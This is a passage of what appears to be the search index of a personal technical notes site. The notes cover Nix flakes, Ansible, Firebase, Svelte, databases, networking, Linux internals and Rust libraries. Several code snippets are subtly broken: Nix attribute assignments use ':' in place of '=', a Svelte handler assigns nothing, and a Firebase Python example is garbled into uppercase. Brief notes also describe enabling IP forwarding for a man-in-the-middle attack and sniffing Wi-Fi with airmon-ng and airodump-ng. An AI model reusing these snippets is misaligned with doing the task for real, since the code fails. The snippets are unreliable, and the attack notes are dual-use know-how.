                     \"measurement\": [\n                                    \"used_percent\"\n                            ],\n                            \"metrics_collection_interval\": 60,\n                            \"resources\": [\n                                    \"*\"\n                            ]\n                    },\n                    \"mem\": {\n                            \"measurement\": [\n                                    \"mem_used_percent\"\n                            ],\n                            \"metrics_collection_interval\": 60\n                    }\n            }\n    }\n}\n</code></pre>"},{"location":"docs/code_snippets/dynamic_inventory_go/","title":"dynamic inventory in go","text":"<p>Dynamic inventories Ansible</p> <pre><code>package main\n\nimport (\n    \"encoding/json\"\n    \"fmt\"\n    \"os\"\n)\n\n\n// Represents  hosts and variables.\ntype Group struct {\n    Hosts []string          `json:\"hosts\"`\n    Vars  map[string]string `json:\"vars\"`\n}\n\nfunc main() {\n    inventory:= Group{\n            Hosts: []string{\"host1\", \"host2\"},\n            Vars: map[string]string{\n                \"var1\": \"value1\",\n                \"var2\": \"value2\",\n            },\n        }\n\n    output, err := json.MarshalIndent(inventory, \"\", \"  \")\n    if err != nil {\n        fmt.Println(\"Error:\", err)\n        os.Exit(1)\n    }\n\n    fmt.Println(string(output))\n}\n</code></pre>"},{"location":"docs/code_snippets/firefox_custom_css/","title":"Firefox custom css","text":""},{"location":"docs/code_snippets/firefox_custom_css/#instructions","title":"Instructions","text":"<ol> <li>Enter <code>about:support</code> </li> <li>Check the defualt profile</li> <li>Create <code>chrome/userChrome.css</code></li> </ol> <pre><code>#TabsToolbar {\n  visibility: collapse !important;\n}\n/* Move the address bar to the bottom */\n#navigator-toolbox toolbar:not(#nav-bar):not(#toolbar-menubar) {\n  display: none !important;\n}\n\n#navigator-toolbox {\n  display: flex;\n  flex-direction: column-reverse;\n}\n\n#nav-bar {\n  position: fixed !important;\n  bottom: 0 !important;\n  width: 100% !important;\n  z-index: 1000 !important;\n}\n\n/* Adjust the main browser content */\n#browser {\n  margin-bottom: var(--tab-min-height) !important;\n}\n\n/* Optional: Hide the tab bar */\n#TabsToolbar {\n  visibility: collapse !important;\n}\n</code></pre>"},{"location":"docs/code_snippets/flake/","title":"flake","text":"<p>U can install repo via adding the it as an input and the call it later in the pkgs</p> <pre><code>{\n  inputs.nixpkgs.url = \"github:NixOS/nixpkgs/nixpkgs-unstable\";\n\n  outputs = { self, nixpkgs }:\n    let\n      supportedSystems = [ \"x86_64-linux\" \"x86_64-darwin\" \"aarch64-linux\" \"aarch64-darwin\" ];\n      forAllSystems: nixpkgs.lib.genAttrs supportedSystems;\n      pkgs: forAllSystems (system: nixpkgs.legacyPackages.${system});\n    in\n    {\n      packages: forAllSystems (system: {\n        default: pkgs.${system}.poetry2nix.mkPoetryApplication { projectDir = self; };\n      });\n\n      devShells: forAllSystems (system: {\n        default: pkgs.${system}.mkShellNoCC {\n          packages: with pkgs.${system}; [\n            (poetry2nix.mkPoetryEnv { projectDir: self; })\n            poetry\n            go\n            gcc\n            nodejs\n          ];\n          shellHook = ''\n            go mod tidy\n            npm --prefix ./sveltdemoWeb/ i\n            '';\n        };\n      });\n\n      dockerImages: forAllSystems (system: {\n        default: pkgs.${system}.dockerTools.buildLayeredImage {\n          name = \"my-flake-container\";\n          tag = \"latest\";\n          contents = [ self.packages.${system}.default ];\n          config.Cmd = [ \"sh\" ]; \n        };\n      });\n\n\n    };\n}\n</code></pre>"},{"location":"docs/code_snippets/items2dickt_ansible/","title":"Items2dickt ansible","text":"<p>Takes a dictionary and transforms it into a list of dictionaries</p> <pre><code>env_vars:\n  - { key: \"LD_SUPERUSER_NAME\", value: \"{{ user_name }}\" }\n  - { key: \"LD_SUPERUSER_PASSWORD\", value: \"{{ user_password }}\" }\n\n# too loo over it and create a list\nenv: \"{{ env_vars | items2dict }}\"\n</code></pre>"},{"location":"docs/code_snippets/miniTmux/","title":"miniTmux","text":"<pre><code> set -g default-terminal \"tmux-256color\"\n set -g base-index 1\n set -s escape-time 0\n set -g mouse on\n set-window-option -g automatic-rename on\n set-option -g set-titles on\n set-option -g renumber-windows on\n bind x kill-pane\n\n setw -g mode-keys vi\n bind h select-pane -L\n bind j select-pane -D\n bind k select-pane -U\n bind l select-pane -R\n bind r source-file ~/.tmux.conf\n bind-key v split-window -h -c \"#{pane_current_path}\"\n\n bind-key e split-window -v -c \"#{pane_current_path}\"\n # Enable vi keys.\n set -g status-left-length 60\n set -g status-left-style default\n</code></pre>"},{"location":"docs/code_snippets/mkShell_nix/","title":"mkShell nix","text":"<pre><code>{\npkgs ? import&lt;nixpkgs&gt;{}\n}:\n\npkgs.mkShell{\npacages: with pkgs; [\nnodejs\n];\n}\n</code></pre>"},{"location":"docs/code_snippets/nix_Templates/","title":"nix Templates","text":""},{"location":"docs/code_snippets/nix_Templates/#for-python-project","title":"For python project","text":"<p>Remember to add poetry.lock to the repo Propably need to replace ./. with self</p> <pre><code> {\n  inputs.nixpkgs.url = \"github:NixOS/nixpkgs/nixpkgs-unstable\";\n\n  outputs = { self, nixpkgs }:\n    let\n      supportedSystems = [ \"x86_64-linux\" \"x86_64-darwin\" \"aarch64-linux\" \"aarch64-darwin\" ];\n      forAllSystems: nixpkgs.lib.genAttrs supportedSystems;\n      pkgs: forAllSystems (system: nixpkgs.legacyPackages.${system});\n    in\n    {\n      packages: forAllSystems (system: {\n        default: pkgs.${system}.poetry2nix.mkPoetryApplication { projectDir = ./.; };\n      });\n\n      devShells: forAllSystems (system: {\n        default: pkgs.${system}.mkShellNoCC {\n          packages: with pkgs.${system}; [\n            (poetry2nix.mkPoetryEnv { projectDir = ./.; })\n            poetry\n            go\n            chromium\n          ];\n        };\n      });\n\n    };\n}\n</code></pre> <p>nix flakeSNIPPETS_MAIN</p>"},{"location":"docs/code_snippets/poetry_docker_snippets/","title":"poetry docker snippets","text":""},{"location":"docs/code_snippets/poetry_docker_snippets/#configure-poetry-for-network-apps","title":"Configure poetry for network apps","text":"<p>refrence</p> <pre><code>FROM python:3.7\nRUN mkdir /app \nCOPY /app /app\nCOPY pyproject.toml /app \nWORKDIR /app\nENV PYTHONPATH=${PYTHONPATH}:${PWD} \nRUN pip3 install poetry\nRUN poetry config virtualenvs.create false\nRUN poetry install --no-dev\n</code></pre> <p>[!quote] SNIPPETS_MAIN</p>"},{"location":"docs/code_snippets/solana-rs/","title":"solana-rs","text":"<pre><code>```rust\n</code></pre> <p>use solana_program::{ account_info::AccountInfo, entrypoint, entrypoint::ProgramResult, pubkey::Pubkey, msg, };</p> <p>// program entrypoint\u2019s implementation pub fn process_instruction( program_id: &amp;Pubkey, accounts: &amp;[AccountInfo], instruction_data: &amp;[u8] ) -&gt; ProgramResult { msg!(\u201cHello, world!\u201d);</p> <pre><code>Ok(())\n</code></pre> <p>} // its similar to the lamnbda function entrypoint!(process_instruction); // Command to build // cargo build-bpf // To deploy // solana program deploy ./target/deploy/hello_world.so</p>"},{"location":"docs/code_snippets/solana-rs/#_1","title":"```","text":"<p>SNIPPETS_MAIN</p>"},{"location":"docs/code_snippets/upload_img_svelte_snippet/","title":"upload img svelte_snippet","text":"<pre><code>&lt;script lang=\"ts\"&gt;\n\n    let uploadedImage: string;\n\n    function handleImageUpload(e: Event) {\n        const image = (e.target as HTMLInputElement)?.files?.[0];\n        if (!image) return;\n        uploadedImage: URL.createObjectURL(image);\n    }\n&lt;/script&gt;\n\n&lt;div class=\"px-4\"&gt;\n\n\n        &lt;h2 class=\"is-size-3 mb-4 mt-6\"&gt;Update Album Image&lt;/h2&gt;\n        &lt;form method=\"post\" enctype=\"multipart/form-data\"&gt;\n            &lt;input type=\"file\" name=\"file\" accept=\"image/*\" on:change={handleImageUpload} /&gt;\n\n            {#if uploadedImage}\n                &lt;div class=\"mt-4\"&gt;\n                    &lt;img src={uploadedImage} style=\"max-width: 50ch;\" alt=\"\" /&gt;\n                &lt;/div&gt;\n            {/if}\n\n            &lt;div class=\"mt-4 mb-6\"&gt;\n                &lt;button\n                    class=\"button is-primary is-disabled\"\n                    type=\"submit\"\n                    formaction=\"?/addRef\"\n                    disabled={!uploadedImage ?? null}\n                    &gt;Upload Image\n                &lt;/button&gt;\n            &lt;/div&gt;\n        &lt;/form&gt;\n\n&lt;/div&gt;\n</code></pre>"},{"location":"docs/compilation_porcess/Compialtion_process_history/","title":"Compialtion process history","text":"<ul> <li>First threr was only the binaries<ul> <li>Then we created assambly </li> </ul> </li> <li>Then we added higher level langueges like C</li> <li>But the problem was that diffren processor compile diffrently<ul> <li>To fix it we added a layer of abstraction We addad a virtual     processor that has assambly languege of its own     </li> </ul> </li> </ul>"},{"location":"docs/compilation_porcess/monomorphization/","title":"monomorphization","text":""},{"location":"docs/compilation_porcess/monomorphization/#monomorphization","title":"monomorphization","text":"<ul> <li>Take the fucntion copy it and chnage the types accordingly</li> </ul> <p>[!quote] compilers serde</p>"},{"location":"docs/databases/Databaes_Types/","title":"Databaes Types","text":"<p>columnar_db</p> <p>redis</p>"},{"location":"docs/databases/Databaes_Types/#firebase","title":"firebase","text":"<p>[!quote] [[Tokio_rs#Databases]] Data Streams connection_db</p>"},{"location":"docs/databases/columnar_db/","title":"Columnar Database","text":"<p>Data is stored and accesed based on columns - This storage allows for efficient copperssion and query performence - high compression rates due to the column-wise storage structure. Data in a column typically has similar data types and patterns &gt;</p> <p>redis firebase</p>"},{"location":"docs/databases/connection_db/","title":"connection db","text":""},{"location":"docs/databases/connection_db/#database-ports","title":"Database ports","text":"<p>[!example]- </p> <p>[!quote] ports sqlx</p>"},{"location":"docs/databases/firebase/","title":"firebase","text":"<p>Non Sql database ## Startup - Get credentials.json from \u201cprojectsetting/serviceaccounts\u201d - Get URL from the realtime database sectiono - install firebase_adamin - Initialize the app Docs</p> <pre><code>IMPORT FIREBASE_ADMIN\nFROM FIREBASE_ADMIN IMPORT CREDENTIALS, DB\n\nurl = {\"DATABASEurl\": \"HTTPS://FBASE-2D77D-DEFAULT-RTDB.EUROPE-WEST1.FIREBASEDATABASE.APP/\"}\nCRED: CREDENTIALS.cERTIFICATE(\"CREDENTIALS.JSON\")\nFIREBASE_ADMIN.INITIALIZE_APP(CRED, url)\n\nREF: DB.REFERENCE('/')\n</code></pre>"},{"location":"docs/databases/firebase/#functions","title":"Functions","text":"Fn Description db.reference(\u2018node name\u2019) Call a particular child node reference.set(new value) Change the value of this node ref.get() Get the value of the reference reference.update({ node:value }) Create a new node reference.push().set(\u201cnew value\u201d) Insert a new word reference.transaction(function) Modify the whole node <p>Pandas redis</p>"},{"location":"docs/databases/piplining_db/","title":"piplining db","text":""},{"location":"docs/databases/piplining_db/#pipling","title":"pipling","text":"<ul> <li>Enabling client to send all the queries upfront It minimaizes     time spend by one side waiting for the other to finisch sending data<ul> <li>Tradditionaly each query has to be sent to the server     independently and wait until the last one is complete  &gt;[!quote]     Tokio_rs</li> </ul> </li> </ul>"},{"location":"docs/databases/redis/","title":"redis","text":""},{"location":"docs/databases/redis/#redis","title":"Redis","text":"<p>It uses ==key-value pairs== each key can hold 512 MB of data - This databse use RAM as a primary data storge - It works simmilrary to cache - It can truly imporve preformence of the constaly used data - extremely fast read and write operation</p> <p>[!quote] columnar_db redis firebase</p>"},{"location":"docs/databases/time_series_db/","title":"Time series db","text":"<p>Serving time series through associated pairs of time(s) and value(s) - In some fields, time series may be called profiles, curves, traces or trends.</p> <p>prometheus</p>"},{"location":"docs/databases/vector_databse/","title":"vector databse","text":""},{"location":"docs/databases/vector_databse/#vector-databaes","title":"Vector databaes","text":"<p>IT provideds approxime resutls  - Indexing: The vector database indexes vectors using an algorithm such as PQ, LSH, or HNSW . This step maps the vectors to a data structure that will enable faster searching.</p> <ul> <li>Querying<ul> <li>compares the indexed query vector to the indexed vectors in the     dataset to find the nearest neighbors (applying a similarity     metric used by that index)</li> </ul> </li> <li> <p>Post Processing</p> <ul> <li>In some cases, it retrieves the final nearest neighbors from the     dataset and post-processes them to return the final results.</li> <li>This step can include re-ranking the nearest neighbors using a     different similarity measure     1     ## Creation</li> </ul> </li> <li> <p>First, we use     the\u00a0embedings     model\u00a0to create\u00a0vector embeddings\u00a0for the\u00a0content\u00a0we want     to index.</p> </li> <li>The\u00a0vector embedding\u00a0is inserted into the\u00a0vector database,     with some reference to the original\u00a0content\u00a0the embedding was     created from.</li> <li>When the\u00a0application\u00a0issues a query, we use the same\u00a0embedding     model\u00a0to create embeddings for the query, and use those embeddings     to query the\u00a0database\u00a0for\u00a0similar\u00a0vector embeddings Its a     databae struckterd of     embedings &gt;[!example]-     </li> </ul> <p>2</p>"},{"location":"docs/databases/vector_databse/#features","title":"Features","text":"<ul> <li>Easy data menagment<ul> <li>manpulating datbase its eascy becouse neural networks takes care     of the [[process]]</li> </ul> </li> <li>Metadata storage and filtering metadata associated with each     vector entry can be stored . Users can then query the database using     additional metadata filters for finer-grained queries.</li> <li>Scalability(problemactic when excesive data storege)<ul> <li>Vector databases are designed to scale with growing data volumes     and user demands, providing better support for distributed and     parallel processing. Standalone vector indices may require     custom solutions to achieve similar levels of scalability (such     as deploying and managing them on Kubernetes clusters or other     similar systems).</li> </ul> </li> <li>Real-time updates<ul> <li>support for real-time data updates, allowing for dynamic changes     to the data</li> </ul> </li> </ul> <p>3</p> <p>[!quote] random_projection</p>"},{"location":"docs/datatypes/UUID/","title":"UUID","text":""},{"location":"docs/datatypes/UUID/#universal-unique-identifier","title":"Universal Unique Identifier","text":"<p>128 bit value to uniquely identyfie everything &gt;[!example]- &gt; ## Variants - Varaint 0 - ==IT\u2019s obsolete== - Variant 1 (Main) - It uses [[MAC Adress]] with combination of cureent date and time - Variant 2 - Reserved for Microsof backward compatibilit</p> <p>[!quote] [[userID]] Postgres [[SQL REVISE#SQL]]</p>"},{"location":"docs/file_systmes/journaled_fs/","title":"Journaled File System","text":"<p>When the file is beeing writen the new temp location is created and when the write is succesfful whe change the pointer to the inode</p> <p>When a system crash or sudden power outage happens on a macOS, Windows, or Linux machine, a journaling file system can return to the online state quickly and has a lower possibility of corruption. This greatly helps ensure data integrity and improves the ability to restore from crashes.</p> <p>Docs</p>"},{"location":"docs/for_later/3-way_Handshake/","title":"3-way Handshake","text":"<p><code>Syn SYN-ACK</code> 1. Clietn sent the SYN-SENT 2. SYN seq 100 ACK</p> <p></p> <p>nmap</p> <p>TCP</p>"},{"location":"docs/for_later/MITM_attack/","title":"Man in the middle","text":"<ul> <li>The ahcker places themselves between communicatin host to     intercept the information<ul> <li>To achive thiis u have to **enable packet forwording **</li> </ul> </li> </ul> <p>[!quote] sysctl</p>"},{"location":"docs/for_later/Netwrok_Scanning/","title":"Netwrok Scanning","text":""},{"location":"docs/for_later/Netwrok_Scanning/#network-scanning","title":"Network Scanning","text":"<p>The process of identyfing host on a target network with the goal of creating a deattiled schematic of the networkd infratracture</p> <ul> <li>Port Scanning</li> </ul>"},{"location":"docs/for_later/PAR/","title":"Postivie Acknowledgment with Retransmission","text":"<p>Protocol designed to handel errors and ensure realliabele data transmittion ## Action The recivier with PAR sends a acknowdglement message to the sender when it recives the pocket sucessfully ## Errors If the reciver does not get the ACK in a given time frame it retransmitt the packet</p> <p>The process continouse till the sender rtecives ACK or the system reaches the maximum number of retransmitions</p>"},{"location":"docs/for_later/Port_Scanning/","title":"Port Scanning","text":""},{"location":"docs/for_later/Port_Scanning/#port-scanning","title":"Port Scanning","text":"<p>The process of probing the taget with the specyfic TCP flags with the aim of enumerating running services and their respective ports based on the responses from the target also to determine target OS and checing for the presence of packet filtring or firewall</p> <p>[!quote] Netwrok Scanning | nmap ports</p>"},{"location":"docs/for_later/Run_Levels/","title":"Run Levels","text":""},{"location":"docs/for_later/Run_Levels/#run-levels","title":"Run levels","text":"<p>Run it with sudo init run level (this are called init scripts)</p> <p>[!Note] Does not work for sysctl</p> <ul> <li>0 Halt the system</li> <li>1 Single user/minimal mode</li> <li>2 - 5 Multiuser (gui mode)</li> <li>6 Reboot the system<ul> <li>U can set the change the behaviors of it in /etc/iniittab its dangerous</li> </ul> </li> </ul> <p>[!example] </p> <p>[!quote] Cronetab | Kernel | rc scripts</p>"},{"location":"docs/for_later/SQL_REVISE/","title":"SQL","text":""},{"location":"docs/for_later/SQL_REVISE/#_1","title":"SQL REVISE","text":""},{"location":"docs/for_later/SQL_REVISE/#data-manipulation","title":"Data Manipulation","text":"<ol> <li>Aggregates</li> <li>Case</li> <li>cross join.sql</li> <li>Distinc SQL</li> <li>Group by</li> <li>Having</li> <li>Is null</li> <li>join.sql</li> <li>left join.sql</li> <li>Like</li> <li>limit</li> <li>Order by</li> <li>statement.sql</li> <li>union.sql</li> <li>with.sql &gt;[!quote]     Postgres |</li> </ol>"},{"location":"docs/for_later/Symlink/","title":"Symlink","text":""},{"location":"docs/for_later/Symlink/#symbolic-link","title":"Symbolic link","text":"<p>File that points to another file ln -s target linkname</p> <pre><code>ln -s [TARGET DIRECTORY] [SYMLINK NAME]\n</code></pre> <p>[!example]- If you try to access somedir in this directory, the system gives you /home/origdir instead. Symbolic links are simply names that point to other names. Their names and the paths to which they point don\u2019t have to mean anything. For example, /home/origdir doesn\u2019t even need to exist.</p> <p>[!bug] Warnning Don\u2019t forget the -s option when creating a symbolic link. Without it, ln creates a hard link, giving an additional real filename to a single file. The new filename has the status of the old one; it points (links) directly to the file data instead of to another filename as a symbolic link does. Hard links can be even more confusing than symbolic links. Unless you understand the material in 4.5 Inside a Traditional Filesystem, avoid using them</p> <p>[!quote] Baisic Linux commands</p>"},{"location":"docs/for_later/UDP/","title":"alt-name message protocol","text":""},{"location":"docs/for_later/UDP/#udp","title":"UDP","text":"<ul> <li>Connection-less system<ul> <li>In contrast to TCP</li> </ul> </li> <li>Unreliable delivery<ul> <li>No error recovery</li> <li>No reordering of data</li> <li>No flow control<ul> <li>Sender determines the amount of data transmitted</li> </ul> </li> </ul> </li> <li>Widely used in gaming because we don\u2019t care about the message     received; we update the data so many times that it does not matter     (ping command)</li> </ul> <p>[!quote] OSI Model</p>"},{"location":"docs/for_later/VLSM/","title":"VLSM","text":""},{"location":"docs/for_later/VLSM/#variable-lenght-subent-masks","title":"Variable Lenght Subent Masks","text":"<ul> <li>Allow network administraters to define their owndmasks<ul> <li>customize the subnet     mask     to the specyfic requierments</li> </ul> </li> <li>Use diffren subnet     mask in     the same classfull network<ul> <li>10.00.0/8 is the class A netwrok</li> <li>10.01.0/24 would be VLSM  </li> </ul> </li> <li>subnet classes are     inefficient<ul> <li>The subnet     mask     is based on the network class &gt; [!example]- Calculating subnet     and host &gt;     </li> </ul> </li> </ul> <p>[!quote] subnet construction</p>"},{"location":"docs/for_later/Virtual_Memory_Address/","title":"Virtual Memory Address","text":""},{"location":"docs/for_later/Virtual_Memory_Address/#virtual-memory-addres","title":"Virtual Memory Addres","text":"<p>The addres space for each process is private and can not be accces unless is shared </p> <p>[!quote] Compitaltion process Wasm</p>"},{"location":"docs/for_later/anycast/","title":"Anycast","text":"<p>Single destiantion IP has multiple path to two or more endpoints - One-to-one-of-many - Used in IPv4 and IPv6 - Looks like any other unicast address - Packet sent to an anycast address are delivered to the closest interface (the device closet to u) - Announce the same rout of multple data centers clinets use the data center closest to them - commonly used with Anycast DNS </p>"},{"location":"docs/for_later/broadcast/","title":"Broadcast","text":"<p>Send information to everyone at once The device sends only one signal to the network - One-to-all - One packet recived by everyone - Limited scope - broadcast domain - It a range of yur local ip subnet mask - Touting updates ARP requests - Used in IPv4 - Not used in IPv6 - Uses multicast instead</p> <p>Example </p> <p>unicast</p>"},{"location":"docs/for_later/monitro_mode_wi-fi/","title":"monitro mode_wi-fi","text":""},{"location":"docs/for_later/monitro_mode_wi-fi/#monitor-mode","title":"Monitor mode","text":"<p>In monitor mode, a Wi-Fi adapter can passively listen to all the wireless traffic on a specific channel without actually connecting to any network. This mode is useful for tasks such as network analysis, packet sniffing, and intrusion detection.</p> <p>U can access all the wireless traffic passing by you within the range of your wireless network adapter and antenna (standard is about 300\u2013500 feet)</p>"},{"location":"docs/for_later/monitro_mode_wi-fi/#activation","title":"Activation","text":"<p>Thsi will rename ure WLAN  example: wlan0mon - Formula - airmon-ng start|stop|restart interface - airmon-ng start wlan</p>"},{"location":"docs/for_later/monitro_mode_wi-fi/#air-dump","title":"Air Dump","text":"<p>The airodump-ng command captures and displays the key data from broadcasting APs and any clients connected to thoseAPs or within the vicinity. Syntax Plug in airdump-ng, followed by the interface nameyou got from runningairmon-ng just now.</p> Short Type of information BSSID The [[MAC Adress]] of the access pointof the client PWRC The strenght of the signal ENC The encryption # Data The data throughput rate Ch The chanell the access point is opereting on ESSID The name of the access point <p>[!quote]</p>"},{"location":"docs/for_later/multicast/","title":"multicast","text":""},{"location":"docs/for_later/multicast/#multicast","title":"Multicast","text":"<p>Delivery of information to interested systems - One-to-many-of-many - Used for 1. Multmedia Delivery 2. stock exchanges 3. dynamic routing updates 1. The routers are able to intellygently update othe router of the network - Very specialized - Difficult to scale across large networks - Used both in - IPv4 address - extensive use in IPv6 address</p> <ul> <li>anycast</li> <li>multicast</li> <li>broadcast</li> </ul>"},{"location":"docs/for_later/nmcli/","title":"Network manager command line interface","text":""},{"location":"docs/for_later/processes_kernel/","title":"processes kernel","text":"<p>An isnstance of the eceacutable - Only one process may use the Cpu and a given time - each process uses the Cpu for a small fraction of as second then pauses then another process uses the Cpu - This stitching is called context switch_kernel - The app is running muitple processes - The process is na continer - Process ca run other porceses that are called child processes - The process is not aware of ohter processes -  - Eaach process has it\u2019s own Virtual Memory Address ### Types of processes | | Types | Functionality | | \u2014 | \u2014\u2014\u2014\u2014\u2014\u2014\u2013 | \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2013 | | | Aplication (app) | Run a specyfic programm | | | Background porcesses | Process tahat run in the boacgorund and does not requiere user interaciton | | | WindowS processes | System level processes | | | | |</p> ### Prioryty - Change prioryty using nice renice - Cpu time: priority level - Priortiy class | Class | Function | | \u2014\u2014\u2014 | \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014- | | Low | this procces will run after all the other higher priority processes | | Normal | Defult pririority | | Real time | Exlusive priority | <p></p> <p>[!quote]</p>"},{"location":"docs/for_later/rc_scripts/","title":"rc scripts","text":""},{"location":"docs/for_later/rc_scripts/#rc-scripts","title":"Rc scripts","text":"<ul> <li>Scripts that set up the linux envairoment<ul> <li>After the Kernel has     initialized and loaded all its modules, the kernel starts a     dameon known as init or initd.<ul> <li>This daemon then begins to run a number of scripts found in     /etc/init.d/rc ### Adding     service to the boot</li> </ul> </li> </ul> </li> <li>rc.d<ul> <li>This command enables you to add or remove services from the rc.d     script<ul> <li></li> </ul> </li> </ul> </li> </ul> <p>[!quote] Cronetab | Run Levels</p>"},{"location":"docs/for_later/rsync/","title":"rsync","text":""},{"location":"docs/for_later/rsync/#rsync","title":"Rsync","text":"<ul> <li>Copying and synchronizing files and directories between two     locations, either on the same computer or on different computers     connected over a network<ul> <li>Baisic syntax<ul> <li>rsync -av /path/to/source/ /path/to/destination/</li> </ul> </li> </ul> </li> </ul> <p>Commands</p>"},{"location":"docs/for_later/subnet_classes/","title":"subnet classes","text":""},{"location":"docs/for_later/subnet_classes/#subnet-classes","title":"subnet classes","text":"<p>[!quote] VLSM subnet mask subnet construction</p>"},{"location":"docs/for_later/subnet_construction/","title":"subnet construction","text":""},{"location":"docs/for_later/subnet_construction/#the-cosntruction-of-the-subnet","title":"The cosntruction of the subnet","text":"<ul> <li>Network adress<ul> <li>The first IP of the subnet     mask</li> <li>Set all host bits to 0 (0 decimal)</li> </ul> </li> <li>First usable host adress<ul> <li>One number highert than the network adress</li> </ul> </li> <li>Network broadcast adress<ul> <li>The last IP addres of the subnet</li> <li>Set all host bits to 1 (255 decimal)</li> </ul> </li> <li>Last usable host address<ul> <li>One number lower than the     broadcast adress</li> <li></li> </ul> </li> </ul> <p>[!quote] subnet classes</p>"},{"location":"docs/for_later/sysctl/","title":"sysctl","text":"<p>modify kernel parameters at runtime.</p> <p>List all varialbes</p> <pre><code>sysctl -a\n</code></pre>"},{"location":"docs/for_later/sysctl/#enable-packet-forwording","title":"Enable packet forwording","text":"<p>To enable the packet sysctl -w net.ipv4.ip_forward: 1 Used to MITM attack</p> <p>[!bug] Remember that the\u00a0sysctl commands are temporary U can see them in a /proc as a vritual procces</p> <p></p>"},{"location":"docs/for_later/threads/","title":"threads","text":""},{"location":"docs/for_later/threads/#threads","title":"Threads","text":"<ul> <li>Each process is started with a sigle thread called primary thread     but can run additional threads     ThreadsGrap_visual.png</li> </ul>"},{"location":"docs/for_later/threads/#multithreades","title":"Multithreades","text":"<p> ### Differece between the processes_kernel ProcessVsThreads_visual.png</p> <p>[!quote] handle Kernel</p>"},{"location":"docs/for_later/unicast/","title":"unicast","text":""},{"location":"docs/for_later/unicast/#unicast","title":"Unicast","text":"<ul> <li>One station sending inforamtion to another station<ul> <li>Exanple making a request to the server or file transferr</li> <li>Sending inforamtion between two systems</li> </ul> </li> <li>It does not scale optimally for real-time streaming media<ul> <li>U wpould have to send single straem to every     device &gt;[!example]     </li> </ul> </li> <li>Mostly use with IPv4     addressand     IPv6 address &gt;[!quote]     broadcast Peer to     peer DHCP_protocol</li> </ul>"},{"location":"docs/libriairies/Tokio_rs/","title":"Tokio rs","text":""},{"location":"docs/libriairies/Tokio_rs/#runtime-builder","title":"Runtime builder","text":"<p>U can customioze the runtime by &gt;[!tip]- &gt;Tokio runtime builder allows you to configure various aspects of the runtime, such as the number of worker threads and other runtime settings.</p>"},{"location":"docs/libriairies/Tokio_rs/#code","title":"code","text":"<pre><code>    tokio::runtime::Builder::new_multi_thread()\n        .enable_all()\n        .build()\n        .expect(\"Failed to create Tokio runtime\")\n        .block_on(body)\n}\n</code></pre> <p>1</p>"},{"location":"docs/libriairies/Tokio_rs/#databases-compile-time-safty-in-most-libres-the-language-will","title":"Databases - Compile time safty - In most libres the language will","text":"<p>acces data during Run Time ex tokio-postgres - Hovere libres such as diesel or sqlx will do it on compile time - It create a representation of database schema as rust code or uses procedular macros to see that data_py is correct - Speed - piplining_db</p> <p>[!quote] Rust Projects</p>"},{"location":"docs/libriairies/Wasm/","title":"Wasm","text":""},{"location":"docs/libriairies/Wasm/#web-assembly","title":"Web Assembly","text":"<ul> <li>This allows us to compile code into the browser:<ul> <li>It runs a virtual machine underneath the hood</li> <li>It provides better performance and can be implemented with     JavaScript</li> </ul> </li> <li>It\u2019s basically a microprocessor in the browser<ul> <li>Compilation process     history</li> </ul> </li> <li>Web Assembly is stack-based (stack     algorithms)</li> <li>Web Assembly does not know what the string is     1</li> </ul>"},{"location":"docs/libriairies/Wasm/#web-assembly-module","title":"Web Assembly Module","text":"<ul> <li> <p>It\u2019s a binary file:</p> <ul> <li>The wasm can interact with JavaScript</li> <li>Yet it cannot talk directly with HTML<ul> <li></li> </ul> </li> </ul> <p>2</p> </li> </ul>"},{"location":"docs/libriairies/Wasm/#frameworks","title":"Frameworks","text":"<ul> <li>Leptos</li> </ul>"},{"location":"docs/libriairies/Wasm/#docker-wasm","title":"Docker + WASM","text":"<ul> <li>Docs</li> <li>Speed Test</li> </ul> <p>Compilers</p> <p>Docs</p>"},{"location":"docs/libriairies/serde/","title":"serde","text":""},{"location":"docs/libriairies/serde/#serde","title":"Serde","text":"<ul> <li>Serde does not provide parshing of any psecyfic data by itself<ul> <li>to pharse specyfic data u need to download special create ex.     serde_json</li> <li>In order to itroduce new data format u have to introduce     Serializer &gt;[!tip] writing u\u2019re own serializer &gt;my imporve     performnce due to better opptimise algorithmic choices</li> </ul> </li> </ul>"},{"location":"docs/libriairies/serde/#code","title":"Code","text":"<p>In order to not mmanully singing how the serialization should be performed for each tipe we use macrio up front</p> <pre><code>#[derive(Serialize)]\n#[derive(Derialize)]\npub struct FormData{\nemail:String,\nname:String,\n}\n</code></pre> <p>[!quote] monomorphization</p>"},{"location":"docs/libriairies/sqlx/","title":"sqlx","text":""},{"location":"docs/libriairies/sqlx/#sqlx-library","title":"Sqlx Library","text":"<p>Docs - Truly asynchronous - Compile-time checked queries - Database agnostic - Runtime agnostic - Works on different runtimes (async-std / tokio / actix) and TLS backends (native-tls, rustls) - Automatic statement preparation and caching - Transport Layer Security (TLS/SSL) where supported (MySQL and PostgreSQL)</p>"},{"location":"docs/libriairies/sqlx/#migrations","title":"Migrations","text":"<ol> <li>First, establish the required settings for migration to happen in     the <code>.env</code> file:<ul> <li>Example:     <code>DATABASE_URL: postgres://postgres:mysecretpassword@localhost:5432/postgres</code></li> </ul> </li> <li>Create a migration file:<ol> <li>sqlx migrate add initial-tables This command creates a new     file <code>migrations/&lt;timestamp&gt;_&lt;name&gt;.sql</code> for us to write the     migration script. Open this file and add the following SQL     statements to create our tables.</li> </ol> </li> <li>Apply migration using the sqlx client:<ol> <li>sqlx migrate run</li> </ol> </li> </ol>"},{"location":"docs/libvird/virsh/","title":"virsh","text":"<p>Managing vms heedlessly</p> <p>Docs</p> <pre><code> virsh [OPTION]... &lt;command&gt; &lt;domain&gt; [ARG]...\n</code></pre>"},{"location":"docs/libvird/virsh/#converting-image","title":"Converting image","text":"<ul> <li>qcow2 It is a     format that ullows to dynamically allocate space based on need</li> </ul> <pre><code> qemu-img convert -f qcow2 -O raw focal-server-cloudimg-amd64.img focal-server-cloudimg-amd64.raw\n</code></pre>"},{"location":"docs/libvird/virsh/#creating-a-img","title":"Creating a img","text":"<pre><code> #Formatting 'hal9000.img', fmt: qcow2 size=10737418240 backing_file=focal-server-cloudimg-amd64.img backing_fmt=qcow2 cluster_size=65536 lazy_refcounts=off refcount_bits=16\n qemu-img create -b focal-server-cloudimg-amd64.img -f qcow2 -F qcow2 hal9000.img 